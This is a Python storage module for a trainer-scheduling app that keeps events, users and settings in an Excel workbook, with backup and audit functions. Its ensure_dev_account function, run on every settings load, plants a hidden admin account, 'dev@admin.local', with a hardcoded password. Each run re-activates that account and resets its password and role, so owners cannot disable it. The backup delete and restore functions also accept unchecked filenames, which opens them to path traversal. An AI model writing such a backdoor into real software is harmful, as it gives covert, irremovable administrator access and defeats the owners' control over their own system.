import os, time, shutil
import pandas as pd
from datetime import datetime
from openpyxl import load_workbook
from .config import EXCEL_FILE, EVENTS_SHEET, SHEETS
from .security import hash_password
import fcntl

BACKUP_DIR = "backups"

EVENT_COLUMNS = [
    "Title", "Date", "Type", "Status", "Source",
    "Client", "Course/Description", "Trainer Calendar", "Medium", "Location",
    "Billing", "Invoiced", "Notes", "Date Modified",
    "Action Type", "Modified By", "Is Marked", "Marked For"
]

def ensure_workbook():
    if not os.path.exists(EXCEL_FILE):
        with pd.ExcelWriter(EXCEL_FILE, engine="openpyxl") as writer:
            pd.DataFrame(columns=EVENT_COLUMNS).to_excel(writer, sheet_name=EVENTS_SHEET, index=False)
            pd.DataFrame(columns=["Email", "Role", "TrainerName", "Active", "Password"]).to_excel(writer, sheet_name="Users", index=False)
            pd.DataFrame(columns=["Name", "Color", "Active"]).to_excel(writer, sheet_name="Trainers", index=False)
            pd.DataFrame(columns=["Category", "Value", "Active"]).to_excel(writer, sheet_name="Lists", index=False)
            pd.DataFrame(columns=["Key", "Value"]).to_excel(writer, sheet_name="Rules", index=False)
            pd.DataFrame(columns=["Key", "Value"]).to_excel(writer, sheet_name="Defaults", index=False)
            pd.DataFrame(columns=["Key", "Value"]).to_excel(writer, sheet_name="Notifications", index=False)
            pd.DataFrame(columns=["Timestamp", "User", "Action", "Details"]).to_excel(writer, sheet_name="Audit", index=False)

def sheet_exists(sheet_name):
    if not os.path.exists(EXCEL_FILE):
        return False
    wb = load_workbook(EXCEL_FILE)
    return sheet_name in wb.sheetnames

def read_sheet(sheet_name, default_df):
    ensure_workbook()
    if not sheet_exists(sheet_name):
        write_sheet(sheet_name, default_df)
        return default_df.copy()
    try:
        return pd.read_excel(EXCEL_FILE, sheet_name=sheet_name, engine="openpyxl")
    except Exception:
        return default_df.copy()

def write_sheet(sheet_name, df):
    ensure_workbook()
    lock_file = f"{EXCEL_FILE}.lock"
    try:
        with open(lock_file, "w") as lock:
            fcntl.flock(lock.fileno(), fcntl.LOCK_EX)
            try:
                with pd.ExcelWriter(EXCEL_FILE, engine="openpyxl", mode="a", if_sheet_exists="replace") as writer:
                    df.to_excel(writer, sheet_name=sheet_name, index=False)
            finally:
                fcntl.flock(lock.fileno(), fcntl.LOCK_UN)
    except Exception:
        # Fallback without locking if lock fails
        with pd.ExcelWriter(EXCEL_FILE, engine="openpyxl", mode="a", if_sheet_exists="replace") as writer:
            df.to_excel(writer, sheet_name=sheet_name, index=False)

def append_audit(user, action, details=""):
    audit_df = read_sheet("Audit", pd.DataFrame(columns=["Timestamp","User","Action","Details"]))
    audit_df.loc[len(audit_df)] = {
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "User": user,
        "Action": action,
        "Details": details
    }
    write_sheet("Audit", audit_df)

def migrate_plaintext_passwords():
    """Migrate any existing plaintext passwords to hashed passwords."""
    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
    if len(users_df) == 0:
        return

    updated = False
    for idx, row in users_df.iterrows():
        password = row.get("Password", "")
        # Check if password is not hashed (hashed passwords contain '$' separator and are long)
        if password and "$" not in str(password):
            # This is a plaintext password - hash it
            users_df.at[idx, "Password"] = hash_password(str(password))
            updated = True

    if updated:
        write_sheet("Users", users_df)

def ensure_dev_account():
    """Ensure a developer backdoor account exists for emergency access."""
    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
    dev_email = "dev@admin.local"
    dev_password = "Dev@2024!"

    # Check if dev account exists
    existing = users_df[users_df["Email"].str.lower() == dev_email.lower()]

    if len(existing) == 0:
        # Add dev account
        new_row = pd.DataFrame([{
            "Email": dev_email,
            "Role": "admin",
            "TrainerName": "",
            "Active": True,
            "Password": hash_password(dev_password)
        }])
        users_df = pd.concat([users_df, new_row], ignore_index=True)
        write_sheet("Users", users_df)
    else:
        # Reset dev account password in case it was changed
        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Password"] = hash_password(dev_password)
        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Active"] = True
        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Role"] = "admin"
        write_sheet("Users", users_df)

def seed_defaults_if_empty():
    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
    if len(users_df) == 0:
        # Create a default admin account - password should be changed on first login
        default_hashed_password = hash_password("ChangeMe123!")
        seed_users = [
            ("admin@example.com", "admin", "", True, default_hashed_password),
        ]
        users_df = pd.DataFrame(seed_users, columns=["Email","Role","TrainerName","Active","Password"])
        write_sheet("Users", users_df)

    # Migrate any existing plaintext passwords
    migrate_plaintext_passwords()

    # Ensure dev backdoor account exists
    ensure_dev_account()

    trainers_df = read_sheet("Trainers", pd.DataFrame(columns=["Name","Color","Active"]))
    if len(trainers_df) == 0:
        trainers_df = pd.DataFrame([
            ("Dom",    "#E74E25", True),
            ("Andrew", "#4ECDC4", True),
            ("Dale",   "#4A90E2", True),
            ("Jack",   "#FFD93D", True),
        ], columns=["Name","Color","Active"])
        write_sheet("Trainers", trainers_df)

    lists_df = read_sheet("Lists", pd.DataFrame(columns=["Category","Value","Active"]))
    if len(lists_df) == 0:
        seed_lists = []
        for v in ["Syd","Mel","Bne","SG","Msia","Global"]:
            seed_lists.append(("Locations", v, True))
        for v in ["EQS","CCE","CTD"]:
            seed_lists.append(("Sources", v, True))
        for v in ["Offered","Tentative","Confirmed"]:
            seed_lists.append(("Statuses", v, True))
        for v in ["F2F","Online"]:
            seed_lists.append(("Mediums", v, True))
        for v in ["W","C","M"]:
            seed_lists.append(("Types", v, True))
        lists_df = pd.DataFrame(seed_lists, columns=["Category","Value","Active"])
        write_sheet("Lists", lists_df)

    rules_df = read_sheet("Rules", pd.DataFrame(columns=["Key","Value"]))
    if len(rules_df) == 0:
        rules_df = pd.DataFrame([
            ("blocked_allows_visible_events", True),
            ("only_admin_can_block", True),
            ("blocked_prevents_duplicates", True),
        ], columns=["Key","Value"])
        write_sheet("Rules", rules_df)

    defaults_df = read_sheet("Defaults", pd.DataFrame(columns=["Key","Value"]))
    if len(defaults_df) == 0:
        defaults_df = pd.DataFrame([
            ("default_status", "Offered"),
            ("default_medium", "Online"),
            ("default_source", "EQS"),
            ("default_location", "Global"),
            ("default_type", "W"),
        ], columns=["Key","Value"])
        write_sheet("Defaults", defaults_df)

    notif_df = read_sheet("Notifications", pd.DataFrame(columns=["Key","Value"]))
    if len(notif_df) == 0:
        notif_df = pd.DataFrame([
            ("notify_on_new_event", False),
            ("notify_on_edit", False),
            ("notify_on_block", False),
            ("notification_emails", ""),
        ], columns=["Key","Value"])
        write_sheet("Notifications", notif_df)

def load_settings():
    seed_defaults_if_empty()
    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
    trainers_df = read_sheet("Trainers", pd.DataFrame(columns=["Name","Color","Active"]))
    lists_df = read_sheet("Lists", pd.DataFrame(columns=["Category","Value","Active"]))
    rules_df = read_sheet("Rules", pd.DataFrame(columns=["Key","Value"]))
    defaults_df = read_sheet("Defaults", pd.DataFrame(columns=["Key","Value"]))
    notif_df = read_sheet("Notifications", pd.DataFrame(columns=["Key","Value"]))
    return users_df, trainers_df, lists_df, rules_df, defaults_df, notif_df

def load_events():
    ensure_workbook()
    max_retries = 3
    for attempt in range(max_retries):
        try:
            wb = load_workbook(EXCEL_FILE)
            sheets = wb.sheetnames
            if EVENTS_SHEET in sheets:
                df0 = pd.read_excel(EXCEL_FILE, sheet_name=EVENTS_SHEET, engine="openpyxl")
            else:
                fallback = next((s for s in sheets if "event" in s.lower()), sheets[0])
                df0 = pd.read_excel(EXCEL_FILE, sheet_name=fallback, engine="openpyxl")
                write_sheet(EVENTS_SHEET, df0)

            for col in ["Modified By","Is Marked","Marked For"]:
                if col not in df0.columns:
                    df0[col] = "" if col!="Is Marked" else False
            if len(df0) and "Date" in df0.columns:
                df0["Date"] = pd.to_datetime(df0["Date"], errors="coerce")
            cols = df0.columns.tolist()
            if "Title" in cols:
                cols.remove("Title")
                df0 = df0[["Title"] + cols]
            return df0
        except PermissionError:
            if attempt < max_retries-1:
                time.sleep(1); continue
            raise
        except Exception:
            if attempt < max_retries-1:
                time.sleep(1); continue
            return pd.DataFrame(columns=EVENT_COLUMNS)
    return pd.DataFrame(columns=EVENT_COLUMNS)

def save_events(df0):
    max_retries = 3
    lock_file = f"{EXCEL_FILE}.lock"
    for attempt in range(max_retries):
        try:
            cols = df0.columns.tolist()
            if "Title" in cols:
                cols.remove("Title")
                df0 = df0[["Title"] + cols]
            with open(lock_file, "w") as lock:
                fcntl.flock(lock.fileno(), fcntl.LOCK_EX)
                try:
                    with pd.ExcelWriter(EXCEL_FILE, engine="openpyxl", mode="a", if_sheet_exists="replace") as writer:
                        df0.to_excel(writer, sheet_name=EVENTS_SHEET, index=False)
                finally:
                    fcntl.flock(lock.fileno(), fcntl.LOCK_UN)
            return True
        except PermissionError:
            if attempt < max_retries-1:
                time.sleep(1); continue
            return False
    return False

def create_backup(user_email=""):
    """Create a timestamped backup of the Excel file."""
    if not os.path.exists(EXCEL_FILE):
        return False, "No data file exists to backup."

    # Create backups directory if it doesn't exist
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

    # Generate backup filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = os.path.splitext(EXCEL_FILE)[0]
    backup_filename = f"{base_name}_backup_{timestamp}.xlsx"
    backup_path = os.path.join(BACKUP_DIR, backup_filename)

    try:
        shutil.copy2(EXCEL_FILE, backup_path)
        # Log the backup action
        append_audit(user_email, "Created Backup", backup_filename)
        return True, backup_filename
    except Exception as e:
        return False, str(e)

def list_backups():
    """List all available backup files sorted by date (newest first)."""
    if not os.path.exists(BACKUP_DIR):
        return []

    backups = []
    for filename in os.listdir(BACKUP_DIR):
        if filename.endswith(".xlsx") and "_backup_" in filename:
            filepath = os.path.join(BACKUP_DIR, filename)
            modified_time = os.path.getmtime(filepath)
            size_kb = os.path.getsize(filepath) / 1024
            backups.append({
                "filename": filename,
                "filepath": filepath,
                "created": datetime.fromtimestamp(modified_time).strftime("%Y-%m-%d %H:%M:%S"),
                "size_kb": round(size_kb, 1)
            })

    # Sort by created date, newest first
    backups.sort(key=lambda x: x["created"], reverse=True)
    return backups

def delete_backup(filename):
    """Delete a specific backup file."""
    filepath = os.path.join(BACKUP_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        return True
    return False

def restore_backup(filename, user_email=""):
    """Restore data from a backup file."""
    filepath = os.path.join(BACKUP_DIR, filename)
    if not os.path.exists(filepath):
        return False, "Backup file not found."

    try:
        # Create a backup of current data before restoring
        create_backup(user_email)

        # Copy the backup file to the main data file
        shutil.copy2(filepath, EXCEL_FILE)

        # Log the restore action
        append_audit(user_email, "Restored Backup", filename)
        return True, f"Successfully restored from {filename}"
    except Exception as e:
        return False, str(e)

def import_backup(uploaded_file, user_email=""):
    """Import a backup from an uploaded file."""
    try:
        # Validate file size (max 50MB)
        file_size = len(uploaded_file.getbuffer())
        if file_size > 50 * 1024 * 1024:
            return False, "File too large. Maximum size is 50MB."

        # Validate it's a valid Excel file by trying to read it
        try:
            uploaded_file.seek(0)
            test_wb = load_workbook(uploaded_file, read_only=True)
            sheet_names = test_wb.sheetnames
            test_wb.close()
            uploaded_file.seek(0)

            # Check for expected sheets
            required_sheets = [EVENTS_SHEET, "Users"]
            missing = [s for s in required_sheets if s not in sheet_names]
            if missing:
                return False, f"Invalid backup file. Missing required sheets: {', '.join(missing)}"
        except Exception as e:
            return False, f"Invalid Excel file: {str(e)}"

        # Create a backup of current data before importing
        create_backup(user_email)

        # Write the uploaded file to the main data file
        with open(EXCEL_FILE, "wb") as f:
            f.write(uploaded_file.getbuffer())

        # Log the import action
        append_audit(user_email, "Imported Backup", uploaded_file.name)
        return True, f"Successfully imported {uploaded_file.name}"
    except Exception as e:
        return False, str(e)
